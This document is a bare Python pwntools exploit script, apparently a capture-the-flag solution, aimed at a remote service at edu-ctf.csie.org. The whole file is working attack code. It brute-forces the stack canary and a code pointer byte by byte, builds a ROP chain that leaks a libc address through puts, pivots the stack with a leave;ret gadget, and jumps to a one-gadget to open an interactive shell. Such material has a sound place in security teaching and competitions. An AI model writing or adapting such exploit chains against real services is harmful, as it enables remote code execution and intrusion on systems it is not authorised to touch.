from pwn import *
context.arch = 'amd64'
y = remote('edu-ctf.csie.org' , 10180)

canary = b''
addr = b''
for i in range(8):
    y.sendlineafter('>\n' , b'2')
    y.sendlineafter(': ' , b'a' * 0xb8)
    for j in range(0 , 254):
        y.sendlineafter('>\n' , '1')
        y.sendafter(': ' , b'a' * 0xb8 + canary + bytes([j]))
        if(y.recv(7) == b'Invalid'):
            continue
        else:
            canary = canary + bytes([j])
            for k in range(10):
                y.sendlineafter('>\n' , b'1')
                y.sendlineafter(': ' , b'0')
            y.sendlineafter('>\n' , b'3')
            break
    #pause()

for i in range(8):
    y.sendlineafter('>\n' , b'2')
    y.sendlineafter(': ' , b'a' * 0xb8)
    for j in range(0 , 255):
        y.sendlineafter('>\n' , '1')
        y.sendafter(': ' , b'a' * 0xb8 + canary + addr + bytes([j]))

        if(y.recvline() == b'Invalid token.\n'):
            continue
        else:
            addr = addr + bytes([j])
            for k in range(10):
                y.sendlineafter('>\n' , b'1')
                y.sendlineafter(': ' , b'0')
            y.sendlineafter('>\n' , b'3')
            break
    #pause()
    #print(addr)

canary = u64(canary)
print('canary ->' , hex(canary))
addr = u64(addr)
#print('addr -> ' , hex(addr))
base = addr - 0x1140
print('base ->' , hex(base))
buf = base + 0x202160
print('buf ->' , hex(buf))
leave_ret = base + 0xbe9
print('leave_ret ->' , hex(leave_ret))

pop_rdi = base + 0x11a3
libc_got = base + 0x201fe0
read_got = base + 0x201fb0
rbx = int(read_got / 8)
puts = base + 0x940
csu_mov = base + 0x1180
csu_pop = base + 0x119a
print('csu_pop ->' , hex(csu_pop))


for i in range(9):
    y.sendlineafter('>\n' , b'2')
    y.sendlineafter(': ' , b'a')
    y.sendlineafter('>\n' , b'1')
    y.sendlineafter(': ' , b'a')
    for j in range(10):
        y.sendlineafter('>\n' , b'1')
        y.sendlineafter(': ' , b'0')
    y.sendlineafter('>\n' , b'3')

rop = b'bbbbbbbb'
#rop += b'a' * 0x08
rop += p64(pop_rdi)
rop += p64(libc_got)
rop += p64(puts)

rop += p64(pop_rdi)
rop += p64(0x0)
rop += p64(csu_pop)
rop += p64(rbx)
rop += p64(buf + 0x400) #pop rbp
rop += p64(0x0) #pop r12
rop += p64(0x0) #pop r13
rop += p64(buf + 0x68) #pop r14 new buf
rop += p64(0x80) #pop r15
rop += p64(csu_mov) #ret

y.sendlineafter('>\n' , b'2')
y.sendlineafter(': ' , rop)
y.sendlineafter('>\n' , b'1')
y.sendlineafter(': ' , rop)
y.sendlineafter('>\n' , b'2')
y.sendlineafter(': ' , b'0')
y.sendlineafter(': ' , b'a' * 0xe8 + p64(canary) + p64(buf) + p64(leave_ret))

#pause()
#log.info(len(rop))
#log.info(rop)
y.sendlineafter('>\n' , b'3')


garbage = y.recv(512)
#print(garbage)
libc = u64(y.recv(6) + b'\0\0')
print('libc ->' , hex(libc))
onegadget = libc - 0x21ab0 + 0xe5858

y.send(p64(onegadget))

y.interactive()